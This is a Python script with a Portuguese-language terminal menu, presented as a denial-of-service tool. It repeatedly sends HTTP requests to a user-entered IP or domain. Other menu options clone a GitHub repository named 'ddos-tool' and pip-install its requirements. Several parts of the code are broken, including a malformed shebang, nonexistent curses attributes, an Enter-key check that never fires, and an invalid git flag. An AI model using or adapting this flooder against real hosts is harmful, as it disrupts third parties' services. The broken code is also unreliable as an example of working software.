#!usr/bin/python3

import requests
import threading
import argparse
import os
import subprocess
import curses
import random
import time

TARGET = ""

LOGO = """

 ######   ####    ######   #### 
     ##  #    #       ##  #    #
     ##  #    #       ##  #    #
 #   ##  #    #  #    ##  #    #   
  ####    ####    #####    ####  

███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
   






"""

def attack(target, message):
    while True:
        try:
            response = requests.get(target)
            print("Request sent to:", target)
        except Exception as e:
            print("Failed to send request:", e)
        time.sleep(random.uniform(0.5, 2.0))  # Intervalo aleatório entre 0.5 e 2 segundos


def main(stdscr):
    stdscr.clear()
    stdscr.addstr(0, (stdscr.cols // 2) - len(LOGO) // 2, LOGO)
    stdscr.addstr(stdscr.lines - 2, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")
    stdscr.refresh()

    options = [
        ("Iniciar Ataque", "a"),
        ("Clonar Repositório", "c"),
        ("Instalar Dependências", "i"),
        ("Sair", "q")
    ]

    current_option = 0

    while True:
        key = stdscr.getkey()

        if key == "KEY_UP" and current_option > 0:
            current_option -= 1
        elif key == "KEY_DOWN" and current_option < len(options) - 1:
            current_option += 1
        elif key == "ENTER":
            if options[current_option][1] == "a":
                stdscr.clear()
                stdscr.addstr(0, (stdscr.cols // 2) - 15, "Informe o alvo:")
                stdscr.addstr(1, (stdscr.cols // 2) - 15, "IP/DOMÍNIO:")
                stdscr.refresh()
                target_ip = stdscr.getstr(0, (stdscr.cols // 2) + 15, 15)
                TARGET = target_ip.decode()
                message = "http://{}".format(TARGET)
                threading.Thread(target=attack, args=(TARGET, message)).start()
                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Ataque iniciado! Pressione qualquer tecla para sair...")
                stdscr.getkey()
                stdscr.clear()
            elif options[current_option][1] == "c":
                stdscr.clear()
                stdscr.addstr(0, (stdscr.cols // 2) - 20, "Clonando repositório...")
                stdscr.refresh()
                subprocess.run(["git", "clone", "--force", "https://github.com/JOJOofSouls/ddos-tool.git"])
                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Repositório clonado com sucesso! Pressione qualquer tecla para continuar...")
                stdscr.getkey()
                stdscr.clear()
            elif options[current_option][1] == "i":
                stdscr.clear()
                stdscr.addstr(0, (stdscr.cols // 2) - 15, "Instalando dependências...")
                stdscr.refresh()
                subprocess.run(["python3", "-m", "pip", "install", "-r", "ddos-tool/requirements.txt"])
                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Dependências instaladas com sucesso! Pressione qualquer tecla para continuar...")
                stdscr.getkey()
                stdscr.clear()
            elif options[current_option][1] == "q":
                break

        stdscr.addstr(stdscr.lines // 2, (stdscr.cols // 2) - len(options[current_option][0]) // 2, options[current_option][0])
        stdscr.refresh()

curses.wrapper(main)
